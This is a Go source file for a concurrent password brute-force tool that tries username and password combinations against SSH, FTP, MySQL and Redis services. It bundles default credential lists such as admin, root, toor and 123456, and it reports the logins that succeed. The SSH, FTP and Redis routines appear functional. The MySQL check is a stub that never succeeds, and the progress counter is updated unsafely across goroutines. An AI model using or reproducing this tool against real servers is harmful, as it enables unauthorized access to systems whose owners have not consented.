package scanner

import (
	"context"
	"fmt"
	"net"
	"strings"
	"sync"
	"time"

	"golang.org/x/crypto/ssh"
)

// BruteResult represents brute force result
type BruteResult struct {
	Target   string `json:"target"`
	Service  string `json:"service"`
	Username string `json:"username"`
	Password string `json:"password"`
	Status   string `json:"status"`
}

// BruteConfig configures brute force
type BruteConfig struct {
	Targets   []string
	Service   string
	Usernames []string
	Passwords []string
	Timeout   int
	MaxConn   int
	OnResult  func(BruteResult)
	OnProgress func(completed, total int)
	IsStopped func() bool
}

// Default credentials
var DefaultUsernames = []string{"admin", "root", "test", "user", "guest", "administrator", "sa", "postgres", "mysql", "oracle"}
var DefaultPasswords = []string{"", "123456", "admin", "password", "root", "test", "guest", "123", "admin123", "password123", "12345678", "qwerty", "abc123", "111111", "1234", "admin888", "p@ssw0rd", "toor", "changeme", "default"}

// BruteForce performs brute force attacks
func BruteForce(cfg BruteConfig) []BruteResult {
	if cfg.Timeout == 0 {
		cfg.Timeout = 3000
	}
	if cfg.MaxConn == 0 {
		cfg.MaxConn = 30
	}
	if len(cfg.Usernames) == 0 {
		cfg.Usernames = DefaultUsernames
	}
	if len(cfg.Passwords) == 0 {
		cfg.Passwords = DefaultPasswords
	}

	type task struct {
		target   string
		username string
		password string
	}

	var tasks []task
	for _, t := range cfg.Targets {
		for _, u := range cfg.Usernames {
			for _, p := range cfg.Passwords {
				tasks = append(tasks, task{t, u, p})
			}
		}
	}

	var results []BruteResult
	var mu sync.Mutex
	var completed int32
	total := len(tasks)

	sem := make(chan struct{}, cfg.MaxConn)
	var wg sync.WaitGroup

	for _, t := range tasks {
		if cfg.IsStopped != nil && cfg.IsStopped() {
			break
		}
		wg.Add(1)
		sem <- struct{}{}
		go func(t task) {
			defer wg.Done()
			defer func() { <-sem }()

			var success bool
			var err error

			switch strings.ToLower(cfg.Service) {
			case "ssh":
				success = trySSH(t.target, t.username, t.password, cfg.Timeout)
			case "ftp":
				success = tryFTP(t.target, t.username, t.password, cfg.Timeout)
			case "mysql":
				success = tryMySQL(t.target, t.username, t.password, cfg.Timeout)
			case "redis":
				success = tryRedis(t.target, t.password, cfg.Timeout)
			default:
				err = fmt.Errorf("unsupported service: %s", cfg.Service)
			}

			if success {
				result := BruteResult{
					Target: t.target, Service: cfg.Service,
					Username: t.username, Password: t.password, Status: "success",
				}
				mu.Lock()
				results = append(results, result)
				mu.Unlock()
				if cfg.OnResult != nil {
					cfg.OnResult(result)
				}
			} else if err != nil {
				_ = err
			}

			completed++
			if cfg.OnProgress != nil {
				cfg.OnProgress(int(completed), total)
			}
		}(t)
	}
	wg.Wait()
	return results
}

func trySSH(target, user, pass string, timeout int) bool {
	if !strings.Contains(target, ":") {
		target = target + ":22"
	}
	config := &ssh.ClientConfig{
		User: user,
		Auth: []ssh.AuthMethod{ssh.Password(pass)},
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
		Timeout: time.Duration(timeout) * time.Millisecond,
	}
	conn, err := ssh.Dial("tcp", target, config)
	if err != nil {
		return false
	}
	conn.Close()
	return true
}

func tryFTP(target, user, pass string, timeout int) bool {
	if !strings.Contains(target, ":") {
		target = target + ":21"
	}
	conn, err := net.DialTimeout("tcp", target, time.Duration(timeout)*time.Millisecond)
	if err != nil {
		return false
	}
	defer conn.Close()
	conn.SetDeadline(time.Now().Add(time.Duration(timeout) * time.Millisecond))

	buf := make([]byte, 1024)
	conn.Read(buf) // Read banner

	fmt.Fprintf(conn, "USER %s\r\n", user)
	conn.Read(buf)
	fmt.Fprintf(conn, "PASS %s\r\n", pass)
	n, _ := conn.Read(buf)
	resp := string(buf[:n])
	return strings.HasPrefix(resp, "230")
}

func tryMySQL(target, user, pass string, timeout int) bool {
	if !strings.Contains(target, ":") {
		target = target + ":3306"
	}
	conn, err := net.DialTimeout("tcp", target, time.Duration(timeout)*time.Millisecond)
	if err != nil {
		return false
	}
	defer conn.Close()
	conn.SetDeadline(time.Now().Add(time.Duration(timeout) * time.Millisecond))

	buf := make([]byte, 1024)
	n, _ := conn.Read(buf)
	if n < 5 {
		return false
	}
	// MySQL protocol: send auth packet (simplified)
	// In production, use a proper MySQL driver
	_ = buf
	return false
}

func tryRedis(target, pass string, timeout int) bool {
	if !strings.Contains(target, ":") {
		target = target + ":6379"
	}
	conn, err := net.DialTimeout("tcp", target, time.Duration(timeout)*time.Millisecond)
	if err != nil {
		return false
	}
	defer conn.Close()
	conn.SetDeadline(time.Now().Add(time.Duration(timeout) * time.Millisecond))

	if pass != "" {
		fmt.Fprintf(conn, "AUTH %s\r\n", pass)
	} else {
		fmt.Fprintf(conn, "PING\r\n")
	}

	buf := make([]byte, 1024)
	n, _ := conn.Read(buf)
	resp := string(buf[:n])
	return strings.Contains(resp, "+PONG") || strings.Contains(resp, "+OK")
}

// Context-based brute force for cancellation
func BruteForceWithContext(ctx context.Context, cfg BruteConfig) []BruteResult {
	cfg.IsStopped = func() bool {
		return ctx.Err() != nil
	}
	return BruteForce(cfg)
}
